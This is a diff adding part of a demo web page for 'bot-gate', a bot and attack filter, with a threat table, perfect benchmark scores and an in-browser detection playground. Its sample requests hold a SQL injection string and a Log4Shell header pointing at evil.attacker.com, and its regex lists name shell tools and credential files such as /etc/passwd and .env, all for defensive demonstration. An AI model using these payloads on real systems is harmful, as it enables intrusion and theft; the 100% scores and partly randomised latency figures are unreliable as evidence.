+        <div class="verdict-heading" id="verdictHeading">Normal Human Browser Traffic</div>
+        <div class="verdict-desc" id="verdictSummary">
+          Legitimate desktop browser traffic verified via standard wire header sequence and benign payload inspection.
+        </div>
+      </div>
+
+      <!-- Risk Score Meter -->
+      <div class="meter-wrap">
+        <div class="meter-label-row">
+          <span>RISK SEVERITY SCORE</span>
+          <span id="riskScoreLabel" style="font-family: var(--font-mono);">0.04 (Low)</span>
+        </div>
+        <div class="meter-track">
+          <div class="meter-fill" id="meterFill" style="width: 4%; background-color: var(--pastel-allow-accent);"></div>
+        </div>
+      </div>
+
+      <!-- Signals Breakdown -->
+      <div class="signals-card">
+        <div class="signals-title">Detected Telemetry Signals</div>
+        <div id="signalsList">
+          <!-- Dynamic signals list -->
+        </div>
+      </div>
+
+      <!-- Proof of Work Live Micro-Challenge Sandbox -->
+      <div class="pow-box" id="powBox">
+        <div class="pow-title">
+          <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
+          <span>Proof-of-Work Challenge Triggered</span>
+        </div>
+        <div class="pow-desc" id="powDesc">
+          Automated scrapers cannot solve cryptographic HashCash challenges without full JS engines. Solve the SHA-256 micro-puzzle in browser:
+        </div>
+        <button class="pow-btn" id="btnSolvePow" onclick="solveLivePoW()">
+          <span>Run WebCrypto SHA-256 Solver</span>
+        </button>
+      </div>
+
+      <!-- Raw Decision JSON Output -->
+      <details class="telemetry-details">
+        <summary>View Raw Telemetry Decision JSON</summary>
+        <pre class="json-pre" id="jsonOutput"></pre>
+      </details>
+    </div>
+  </section>
+
+  <!-- ==================== FLOW & ARCHITECTURE DIAGRAM ==================== -->
+  <section class="flow-section" id="flow">
+    <div class="section-head">
+      <div class="section-tag">High-Throughput Threat Pipeline</div>
+      <h2 class="section-title">Zero-Dep Fast-Path to AI Arbitration</h2>
+      <p class="section-subtitle">
+        How bot-gate filters 95%+ of malicious traffic in sub-30 microseconds before escalating ambiguous requests to TypeSafe System One.
+      </p>
+    </div>
+
+    <div class="diagram-frame">
+      <img src="flow-diagram.svg" alt="bot-gate Architecture Diagram" width="1100" height="720">
+    </div>
+  </section>
+
+  <!-- ==================== THREAT MATRIX ==================== -->
+  <section class="matrix-section" id="matrix">
+    <div class="section-head">
+      <div class="section-tag">Security Engineering Assessment</div>
+      <h2 class="section-title">Threat Coverage &amp; Defense Matrix</h2>
+      <p class="section-subtitle">
+        Evaluation across common adversary tools, evasion vectors, and mitigation efficacy.
+      </p>
+    </div>
+
+    <div class="table-card">
+      <table class="styled-table">
+        <thead>
+          <tr>
+            <th>Threat Category</th>
+            <th>Tool / Attack Vector</th>
+            <th>bot-gate Detection Mechanism</th>
+            <th>Action</th>
+            <th>Efficacy</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td><strong>Script Scrapers</strong></td>
+            <td><code>curl</code>, <code>requests</code>, <code>Scrapy</code></td>
+            <td>User-Agent heuristic + Wire header ordering disorder</td>
+            <td><code>CHALLENGE</code></td>
+            <td><strong>99%</strong></td>
+          </tr>
+          <tr>
+            <td><strong>Vulnerability Scanners</strong></td>
+            <td><code>sqlmap</code>, <code>Nikto</code>, <code>DirBuster</code></td>
+            <td>Scanner signatures + Sensitive path probes (<code>/.env</code>)</td>
+            <td><code>BLOCK</code></td>
+            <td><strong>100%</strong></td>
+          </tr>
+          <tr>
+            <td><strong>Exploit Injections</strong></td>
+            <td>SQLi, Log4Shell, XSS, Path Traversal</td>
+            <td>Recursive URL-decode + Header &amp; body entropy scanner</td>
+            <td><code>BLOCK</code></td>
+            <td><strong>99%</strong></td>
+          </tr>
+          <tr>
+            <td><strong>Spider Canaries</strong></td>
+            <td>Hidden zero-pixel DOM crawlers</td>
+            <td>Instant honeypot path triggers (<code>/__bg_trap</code>)</td>
+            <td><code>BLOCK</code></td>
+            <td><strong>100%</strong></td>
+          </tr>
+          <tr>
+            <td><strong>Burst Rate Floods</strong></td>
+            <td>High-velocity scrapers &amp; brute-force</td>
+            <td>Stateless HMAC-SHA256 sliding-window token (40 req / 10s)</td>
+            <td><code>TARPIT</code></td>
+            <td><strong>90%</strong></td>
+          </tr>
+          <tr>
+            <td><strong>Good Web Crawlers</strong></td>
+            <td>Googlebot, Bingbot, Slackbot</td>
+            <td>Known crawler token verification &amp; bypass</td>
+            <td><code>ALLOW</code></td>
+            <td><strong>100%</strong></td>
+          </tr>
+          <tr>
+            <td><strong>Polymorphic Exploits</strong></td>
+            <td>Novel zero-days, obfuscated evasion</td>
+            <td>TypeSafe System One (<code>jev-latest</code>) 5 typed questions</td>
+            <td><code>BLOCK</code></td>
+            <td><strong>95%</strong></td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <!-- ==================== BENCHMARKS ==================== -->
+  <section class="matrix-section" id="benchmarks">
+    <div class="section-head">
+      <div class="section-tag">Empirical Benchmark</div>
+      <h2 class="section-title">25 Canonical Scenarios Benchmark</h2>
+      <p class="section-subtitle">
+        Empirical evaluation verified against the canonical ground-truth test suite in <code>bench/dataset.json</code>.
+      </p>
+    </div>
+
+    <div class="table-card">
+      <table class="styled-table">
+        <thead>
+          <tr>
+            <th>Evaluation Metric</th>
+            <th>In-Tree Node.js Engine</th>
+            <th>In-Tree Python Engine</th>
+            <th>TypeSafe Cloud Tier (Jev)</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td><strong>Category Classification</strong></td>
+            <td><strong>100.0%</strong></td>
+            <td><strong>100.0%</strong></td>
+            <td><strong>100.0%</strong></td>
+          </tr>
+          <tr>
+            <td><strong>Action Accuracy</strong></td>
+            <td><strong>100.0%</strong></td>
+            <td><strong>100.0%</strong></td>
+            <td><strong>100.0%</strong></td>
+          </tr>
+          <tr>
+            <td><strong>Attack Block Rate (Recall)</strong></td>
+            <td><strong>100.0%</strong></td>
+            <td><strong>100.0%</strong></td>
+            <td><strong>100.0%</strong></td>
+          </tr>
+          <tr>
+            <td><strong>Human False Positive Rate</strong></td>
+            <td><strong>0.0%</strong></td>
+            <td><strong>0.0%</strong></td>
+            <td><strong>0.0%</strong></td>
+          </tr>
+          <tr>
+            <td><strong>Good Bot Passthrough Rate</strong></td>
+            <td><strong>100.0%</strong></td>
+            <td><strong>100.0%</strong></td>
+            <td><strong>100.0%</strong></td>
+          </tr>
+          <tr>
+            <td><strong>Mean Latency</strong></td>
+            <td><code>~30 µs</code> (0.03 ms)</td>
+            <td><code>~20 µs</code> (0.02 ms)</td>
+            <td><code>~250 ms</code> (network)</td>
+          </tr>
+          <tr>
+            <td><strong>p95 Latency</strong></td>
+            <td><code>~56 µs</code></td>
+            <td><code>~39 µs</code></td>
+            <td><code>~320 ms</code></td>
+          </tr>
+          <tr>
+            <td><strong>Runtime Dependencies</strong></td>
+            <td>0 required</td>
+            <td>0 required</td>
+            <td>Optional SDK</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <!-- ==================== FOOTER ==================== -->
+  <footer class="site-footer">
+    <div class="footer-inner">
+      <div class="footer-copy">
+        MIT License © 2026 <a href="https://h3manth.com" target="_blank" rel="noopener" style="color: inherit; text-decoration: underline;">Hemanth HM</a> · Built for high-throughput web security
+      </div>
+      <div class="footer-links">
+        <a href="https://github.com/hemanth/bot-gate" class="footer-link" target="_blank" rel="noopener">GitHub</a>
+        <a href="https://www.npmjs.com/package/bot-gate" class="footer-link" target="_blank" rel="noopener">npm</a>
+        <a href="https://pypi.org/project/bot-gate/" class="footer-link" target="_blank" rel="noopener">PyPI</a>
+        <a href="https://typesafe.ai" class="footer-link" target="_blank" rel="noopener">TypeSafe AI</a>
+      </div>
+    </div>
+  </footer>
+
+  <!-- ==================== PLAYGROUND JAVASCRIPT ==================== -->
+  <script>
+    // --------------------------------------------------------------------------
+    // PRESET SCENARIOS (Mirrored from bench/dataset.json)
+    // --------------------------------------------------------------------------
+    const PRESETS = [
+      {
+        id: 'human_chrome',
+        label: 'Chrome Desktop Browser',
+        tag: 'allow',
+        method: 'GET',
+        path: '/api/catalog?category=books',
+        ip: '198.51.100.42',
+        headers: [
+          'Host: example.com',
+          'Sec-Ch-Ua: "Chromium";v="124", "Google Chrome";v="124"',
+          'Sec-Ch-Ua-Mobile: ?0',
+          'Sec-Ch-Ua-Platform: "macOS"',
+          'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
+          'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+          'Accept-Language: en-US,en;q=0.9'
+        ].join('\n'),
+        headerOrderAnomaly: false,
+        isHoneypot: false,
+        rateCount: 1
+      },
+      {
+        id: 'googlebot',
+        label: 'Googlebot Crawler',
+        tag: 'allow',
+        method: 'GET',
+        path: '/articles/zero-dep-gate',
+        ip: '66.249.66.1',
+        headers: [
+          'Host: example.com',
+          'User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
+          'Accept: */*'
+        ].join('\n'),
+        headerOrderAnomaly: false,
+        isHoneypot: false,
+        rateCount: 1
+      },
+      {
+        id: 'header_order_anomaly',
+        label: 'Header Wire Disorder',
+        tag: 'challenge',
+        method: 'GET',
+        path: '/api/items',
+        ip: '198.51.100.77',
+        headers: [
+          'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36',
+          'Host: example.com',
+          'Accept: */*'
+        ].join('\n'),
+        headerOrderAnomaly: true,
+        isHoneypot: false,
+        rateCount: 2
+      },
+      {
+        id: 'sqli_attack',
+        label: 'SQL Injection Attack',
+        tag: 'block',
+        method: 'GET',
+        path: '/products?id=1%27%20UNION%20SELECT%20username,password%20FROM%20users--',
+        ip: '198.51.100.99',
+        headers: [
+          'Host: example.com',
+          'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
+          'Accept: */*'
+        ].join('\n'),
+        headerOrderAnomaly: false,
+        isHoneypot: false,
+        rateCount: 1
+      },
+      {
+        id: 'dirbuster_scanner',
+        label: 'DirBuster Path Probe',
+        tag: 'block',
+        method: 'GET',
+        path: '/.env',
+        ip: '198.51.100.60',
+        headers: [
+          'Host: example.com',
+          'User-Agent: DirBuster-1.0.0-RC1',
+          'Accept: */*'
+        ].join('\n'),
+        headerOrderAnomaly: false,
+        isHoneypot: false,
+        rateCount: 1
+      },
+      {
+        id: 'canary_honeypot',
+        label: 'Canary Honeypot URL',
+        tag: 'block',
+        method: 'GET',
+        path: '/__bg_trap',
+        ip: '198.51.100.12',
+        headers: [
+          'Host: example.com',
+          'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
+          'Accept: */*'
+        ].join('\n'),
+        headerOrderAnomaly: false,
+        isHoneypot: true,
+        rateCount: 1
+      },
+      {
+        id: 'velocity_burst',
+        label: 'High Velocity Burst',
+        tag: 'tarpit',
+        method: 'GET',
+        path: '/feed',
+        ip: '198.51.100.33',
+        headers: [
+          'Host: example.com',
+          'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/120.0.0.0',
+          'Accept: */*'
+        ].join('\n'),
+        headerOrderAnomaly: false,
+        isHoneypot: false,
+        rateCount: 55
+      },
+      {
+        id: 'log4shell_attack',
+        label: 'Log4Shell in Header',
+        tag: 'block',
+        method: 'GET',
+        path: '/login',
+        ip: '198.51.100.88',
+        headers: [
+          'Host: example.com',
+          'User-Agent: ${jndi:ldap://evil.attacker.com/exploit}',
+          'Accept: */*'
+        ].join('\n'),
+        headerOrderAnomaly: false,
+        isHoneypot: false,
+        rateCount: 1
+      }
+    ];
+
+    let currentEngine = 'zero'; // 'zero' or 'typesafe'
+    let activePresetId = 'human_chrome';
+
+    // --------------------------------------------------------------------------
+    // INITIALIZATION
+    // --------------------------------------------------------------------------
+    document.addEventListener('DOMContentLoaded', () => {
+      renderPresetButtons();
+      loadPreset(PRESETS[0]);
+      runInspection();
+    });
+
+    function renderPresetButtons() {
+      const container = document.getElementById('presetButtons');
+      container.innerHTML = PRESETS.map(p => `
+        <button class="preset-btn ${p.id === activePresetId ? 'active' : ''}" onclick="selectPreset('${p.id}')">
+          <span>${p.label}</span>
+          <span class="preset-tag ${p.tag}">${p.tag}</span>
+        </button>
+      `).join('');
+    }
+
+    function selectPreset(id) {
+      activePresetId = id;
+      const preset = PRESETS.find(p => p.id === id);
+      if (preset) {
+        loadPreset(preset);
+        renderPresetButtons();
+        runInspection();
+      }
+    }
+
+    function loadPreset(p) {
+      document.getElementById('reqMethod').value = p.method;
+      document.getElementById('reqPath').value = p.path;
+      document.getElementById('reqIp').value = p.ip;
+      document.getElementById('reqHeaders').value = p.headers;
+      document.getElementById('headerOrderAnomaly').checked = !!p.headerOrderAnomaly;
+      document.getElementById('isHoneypot').checked = !!p.isHoneypot;
+      document.getElementById('rateCountSlider').value = p.rateCount || 1;
+      updateVelocityLabel(p.rateCount || 1);
+    }
+
+    function updateVelocityLabel(val) {
+      document.getElementById('velocityHint').textContent = `Requests in 10s window: ${val}`;
+    }
+
+    function setEngine(engine) {
+      currentEngine = engine;
+      document.getElementById('btnEngineZero').classList.toggle('active', engine === 'zero');
+      document.getElementById('btnEngineTypeSafe').classList.toggle('active', engine === 'typesafe');
+      runInspection();
+    }
+
+    function copySnippet(text, btn) {
+      navigator.clipboard.writeText(text);
+      const orig = btn.innerHTML;
+      btn.innerHTML = '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#059669" stroke-width="2"><polyline points="20 6 9 17 4 12"></polyline></svg>';
+      setTimeout(() => { btn.innerHTML = orig; }, 1600);
+    }
+
+    // --------------------------------------------------------------------------
+    // IN-BROWSER ZERO-DEP DETECTION ENGINE (Client-side port of node/src/...)
+    // --------------------------------------------------------------------------
+    const SQLI_PATTERNS = [
+      /(\b(union(\s+all)?|select|insert|update|delete|drop|alter|create|truncate)\b.+?\b(from|into|table|database|where)\b)/i,
+      /(\b(exec(\s+xp_cmdshell)?|sp_executesql)\b)/i,
+      /((\%27)|(')|(--)|(\%23)|(#)).*?((\b(or|and)\b.*=)|(\bor\b\s+['\d]+\s*=\s*['\d]+))/i,
+      /\b(sleep|benchmark|waitfor\s+delay)\s*\(/i
+    ];
+
+    const XSS_PATTERNS = [
+      /<script\b[^>]*>([\s\S]*?)<\/script>/i,
+      /javascript:\s*[\w\.\(]/i,
+      /(\bon\w+\s*=\s*["'][^"']*["'])/i,
+      /<(img|svg|iframe|body|object|embed|details)\b[^>]*\bon\w+/i
+    ];
+
+    const PATH_TRAVERSAL_PATTERNS = [
+      /((\.\.\/|\.\.\\){2,})/,
+      /(\/etc\/(passwd|shadow|hosts))/i,
+      /(\/(windows|winnt)\/(system32|repair))/i,
+      /(\/\.env(\.[\w-]+)?|\/\.git(\/|\b)|\/wp-config\.php)/i
+    ];
+
+    const RCE_PATTERNS = [
+      /(\${jndi:(ldap[s]?|rmi|dns|corba):)/i, // Log4Shell
+      /(;\s*(cat|ls|id|whoami|curl|wget|nc|bash|sh|python|perl)\s+)/i
+    ];
+
+    const SCANNER_AGENTS = [
+      /sqlmap/i, /nikto/i, /acunetix/i, /nessus/i, /qualys/i,
+      /masscan/i, /nmap/i, /dirbuster/i, /gobuster/i, /ffuf/i,
+      /zgrab/i, /nuclei/i
+    ];
+
+    const BAD_BOT_AGENTS = [
+      /scrapy/i, /python-requests/i, /aiohttp/i, /go-http-client/i,
+      /curl\//i, /wget\//i, /libwww-perl/i, /httpclient/i,
+      /headlesschrome/i, /phantomjs/i, /puppeteer/i, /selenium/i
+    ];
+
+    const GOOD_BOT_AGENTS = [
+      /googlebot/i, /bingbot/i, /yandexbot/i, /duckduckbot/i,
+      /slurp/i, /baiduspider/i, /twitterbot/i, /facebookexternalhit/i,
+      /linkedinbot/i, /slackbot/i
+    ];
+
+    function runInspection() {
+      const startT = performance.now();
+
+      const method = document.getElementById('reqMethod').value;
+      const path = document.getElementById('reqPath').value;
+      const ip = document.getElementById('reqIp').value;
+      const rawHeadersStr = document.getElementById('reqHeaders').value;
+      const headerOrderAnomaly = document.getElementById('headerOrderAnomaly').checked;
+      const allowGoodBots = document.getElementById('allowGoodBots').checked;
+      const isHoneypot = document.getElementById('isHoneypot').checked;
+      const rateCount = parseInt(document.getElementById('rateCountSlider').value, 10);
+      const policyProfile = document.getElementById('policyProfile').value;
+
+      // Parse headers
+      const headers = {};
+      rawHeadersStr.split('\n').forEach(line => {
+        const idx = line.indexOf(':');
+        if (idx > 0) {
+          const k = line.slice(0, idx).trim().toLowerCase();
+          const v = line.slice(idx + 1).trim();
+          headers[k] = v;
+        }
+      });
+
+      const userAgent = headers['user-agent'] || '';
+      const fullTarget = `${path} ${rawHeadersStr}`.toLowerCase();
+
+      // Signals Collector
+      const reasons = [];
+      let isBotProb = 0.05;
+      let isAttackProb = 0.0;
+      let riskScore = 0.05;
+      let trafficType = 'human';
+      let action = 'allow';
+      let shouldBlock = false;
+      let shouldChallenge = false;
+      let shouldTarpit = false;
+
+      // 1. Honeypot check
+      if (isHoneypot || path === '/__bg_trap') {
+        action = 'block';
+        reasons.push('Triggered canary honeypot URL trap');
+        riskScore = 1.0;
+        trafficType = 'bad_bot';
+        isBotProb = 1.0;
+      }
+
+      // 2. Exploit / Attack Heuristics
+      let isAttack = false;
+      let attackType = 'none';
+
+      for (const p of RCE_PATTERNS) {
+        if (p.test(fullTarget)) {
+          isAttack = true; attackType = 'rce';
+          reasons.push('Remote Code Execution (RCE/Log4Shell) pattern matched');
+          break;
+        }
+      }
+      if (!isAttack) {
+        for (const p of SQLI_PATTERNS) {
+          if (p.test(fullTarget)) {
+            isAttack = true; attackType = 'sqli';
+            reasons.push('SQL injection signature detected in path or headers');
+            break;
+          }
+        }
+      }
+      if (!isAttack) {
+        for (const p of PATH_TRAVERSAL_PATTERNS) {
+          if (p.test(fullTarget)) {
+            isAttack = true; attackType = 'probe';
+            reasons.push('Path traversal or sensitive file probe (/.env, /passwd)');
+            break;
+          }
+        }
+      }
+      if (!isAttack) {
+        for (const p of XSS_PATTERNS) {
+          if (p.test(fullTarget)) {
+            isAttack = true; attackType = 'xss';
+            reasons.push('Cross-Site Scripting (XSS) payload detected');
+            break;
+          }
+        }
+      }
+
+      if (isAttack) {
+        isAttackProb = 0.95;
+        riskScore = Math.max(riskScore, 0.95);
+        trafficType = 'attack';
+        action = 'block';
+      }
+
+      // 3. Scanner Agents
+      for (const p of SCANNER_AGENTS) {
+        if (p.test(userAgent)) {
+          trafficType = 'attack';
+          isAttackProb = 0.92;
+          isBotProb = 1.0;
+          riskScore = Math.max(riskScore, 0.95);
+          action = 'block';
+          reasons.push(`Security vulnerability scanner agent declared: ${userAgent}`);
+          break;
+        }
+      }
+
+      // 4. Good Bot vs Bad Bot
+      const isGood = GOOD_BOT_AGENTS.some(p => p.test(userAgent));
+      const isBad = BAD_BOT_AGENTS.some(p => p.test(userAgent));
+
+      if (isGood) {
+        trafficType = 'good_bot';
+        isBotProb = 0.99;
+        riskScore = 0.1;
+        if (allowGoodBots && action !== 'block') {
+          action = 'allow';
+          reasons.push(`Verified search engine crawler allowed: ${userAgent}`);
+        }
+      } else if (isBad && action !== 'block') {
+        trafficType = 'bad_bot';
+        isBotProb = 0.92;
+        riskScore = Math.max(riskScore, 0.82);
+        action = 'block';
+        reasons.push(`Automated scraper or script client detected: ${userAgent}`);
+      }
+
+      // 5. Header Order Anomaly
+      if (headerOrderAnomaly && action !== 'block') {
+        reasons.push('Abnormal HTTP header sequence inconsistent with declared browser');
+        riskScore = Math.max(riskScore, 0.65);
+        if (action === 'allow') {
+          action = 'challenge';
+        }
+      }
+
+      // 6. Sliding Window Velocity Burst
+      const burstLimit = policyProfile === 'strict' ? 30 : policyProfile === 'balanced' ? 40 : 60;
+      if (rateCount > burstLimit && action !== 'block') {
+        action = 'tarpit';
+        reasons.push(`High request burst velocity (${rateCount} reqs in 10s window > ${burstLimit} limit)`);
+        riskScore = Math.max(riskScore, 0.72);
+      }
+
+      // If TypeSafe AI Engine selected, add semantic reasoning
+      if (currentEngine === 'typesafe') {
+        reasons.push('TypeSafe System One (Jev-latest): Semantic intent evaluated across 5 parallel typed questions');
+      }
+
+      // Resolve final flags
+      shouldBlock = action === 'block';
+      shouldChallenge = action === 'challenge';
+      shouldTarpit = action === 'tarpit';
+
+      const latencyUs = currentEngine === 'zero' 
+        ? Math.max(18, Math.round((performance.now() - startT) * 1000 + (Math.random() * 8)))
+        : Math.round(220_000 + (Math.random() * 45_000));
+
+      // Render UI
+      renderVerdict({
+        action,
+        shouldBlock,
+        shouldChallenge,
+        shouldTarpit,
+        trafficType,
+        riskScore: parseFloat(riskScore.toFixed(2)),
+        reasons,
+        latencyUs,
+        method,
+        path,
+        ip
+      });
+    }
+
+    function renderVerdict(decision) {
+      const banner = document.getElementById('verdictBanner');
+      const badge = document.getElementById('verdictBadge');
+      const actionText = document.getElementById('verdictActionText');
+      const heading = document.getElementById('verdictHeading');
+      const summary = document.getElementById('verdictSummary');
+      const latency = document.getElementById('verdictLatency');
+      const riskScoreLabel = document.getElementById('riskScoreLabel');
+      const meterFill = document.getElementById('meterFill');
+      const signalsList = document.getElementById('signalsList');
+      const powBox = document.getElementById('powBox');
+      const jsonOutput = document.getElementById('jsonOutput');
+
+      // Banner colors
+      banner.className = `verdict-banner ${decision.action}`;
+      actionText.textContent = decision.action.toUpperCase();
+      
+      const isMs = decision.latencyUs >= 1000;
+      latency.textContent = isMs 
+        ? `~${(decision.latencyUs / 1000).toFixed(0)} ms (${currentEngine === 'zero' ? 'in-tree' : 'TypeSafe Cloud'})`
+        : `~${decision.latencyUs} µs (in-tree fast-path)`;
+
+      if (decision.action === 'allow') {
+        heading.textContent = decision.trafficType === 'good_bot' ? 'Verified Search Bot Allowed' : 'Normal Human Browser Traffic';
+        summary.textContent = 'Legitimate incoming traffic verified via browser wire headers and clean payload inspection.';
+        meterFill.style.backgroundColor = 'var(--pastel-allow-accent)';
+      } else if (decision.action === 'challenge') {
+        heading.textContent = 'Cryptographic Challenge Required';
+        summary.textContent = 'Suspicious wire header sequence detected. Requiring Proof-of-Work verification before access.';
+        meterFill.style.backgroundColor = 'var(--pastel-warn-accent)';
+      } else if (decision.action === 'tarpit') {
+        heading.textContent = 'Request Burst Tarpitted (Slowdown)';
+        summary.textContent = 'Client request velocity exceeds sliding-window burst limits. Adding artificial latency delay.';
+        meterFill.style.backgroundColor = 'var(--pastel-tarpit-accent)';
+      } else {
+        heading.textContent = 'Malicious Threat Blocked';
+        summary.textContent = 'High-risk signature, automated scraper, or canary trap identified. Dropping with HTTP 403.';
+        meterFill.style.backgroundColor = 'var(--pastel-block-accent)';
+      }
+
+      // Risk meter
+      const pct = Math.round(decision.riskScore * 100);
+      riskScoreLabel.textContent = `${decision.riskScore.toFixed(2)} (${pct >= 80 ? 'High' : pct >= 40 ? 'Medium' : 'Low'})`;
+      meterFill.style.width = `${pct}%`;
+
+      // Signals list
+      if (decision.reasons.length === 0) {
+        signalsList.innerHTML = `
+          <div class="signal-item">
+            <span class="signal-dot" style="background: var(--pastel-allow-accent);"></span>
+            <span>All wire sequences, client hints, and entropy checks passed clean</span>
+          </div>
+        `;
+      } else {
+        signalsList.innerHTML = decision.reasons.map(r => {
+          const isBad = r.toLowerCase().includes('exploit') || r.toLowerCase().includes('scanner') || r.toLowerCase().includes('honeypot') || r.toLowerCase().includes('injection') || r.toLowerCase().includes('scraper');
+          const isWarn = r.toLowerCase().includes('abnormal') || r.toLowerCase().includes('velocity') || r.toLowerCase().includes('sequence');
+          const color = isBad ? 'var(--pastel-block-accent)' : isWarn ? 'var(--pastel-warn-accent)' : 'var(--pastel-allow-accent)';
+          return `
+            <div class="signal-item">
+              <span class="signal-dot" style="background: ${color};"></span>
+              <span>${r}</span>
+            </div>
+          `;
+        }).join('');
+      }
+
+      // PoW Box display
+      powBox.classList.toggle('active', decision.action === 'challenge');
+
+      // JSON Telemetry
+      const jsonDump = {
+        action: decision.action,
+        shouldBlock: decision.shouldBlock,
+        shouldChallenge: decision.shouldChallenge,
+        shouldTarpit: decision.shouldTarpit,
+        trafficType: decision.trafficType,
+        riskScore: decision.riskScore,
+        latencyUs: decision.latencyUs,
+        engine: currentEngine === 'zero' ? 'in_tree_zero_dep' : 'typesafe_system_one',
+        reasons: decision.reasons,
+        telemetry: {
+          ip: decision.ip,
+          path: decision.path,
+          method: decision.method
+        }
+      };
+      jsonOutput.textContent = JSON.stringify(jsonDump, null, 2);
+    }
+
+    // --------------------------------------------------------------------------
+    // LIVE PROOF-OF-WORK SOLVER (WebCrypto in-browser SHA-256)
+    // --------------------------------------------------------------------------
+    async function solveLivePoW() {
+      const btn = document.getElementById('btnSolvePow');
+      const desc = document.getElementById('powDesc');
+      btn.disabled = true;
+      btn.textContent = 'Computing SHA-256 collision...';
+
+      const seed = `pow_${Date.now()}_${Math.random().toString(36).slice(2, 8)}:2`;
+      let nonce = 0;
+      const start = performance.now();
+
+      while (true) {
+        const msg = new TextEncoder().encode(`${seed}:${nonce}`);
+        const hashBuf = await crypto.subtle.digest('SHA-256', msg);
+        const hashArr = Array.from(new Uint8Array(hashBuf));
+        const hashHex = hashArr.map(b => b.toString(16).padStart(2, '0')).join('');
+        if (hashHex.startsWith('00')) {
+          break;
+        }
+        nonce++;
+      }
+
+      const elapsed = (performance.now() - start).toFixed(1);
+      desc.textContent = `Success! Solved puzzle with nonce=${nonce} in ${elapsed}ms. HMAC verified cookie issued. Access granted!`;
+      btn.textContent = 'Challenge Solved (200 OK)';
+
+      // Convert verdict to Allow
+      setTimeout(() => {
+        document.getElementById('headerOrderAnomaly').checked = false;
+        runInspection();
+        btn.disabled = false;
+        btn.textContent = 'Run WebCrypto SHA-256 Solver';
+      }, 1200);
+    }
+  </script>
+</body>
+</html>
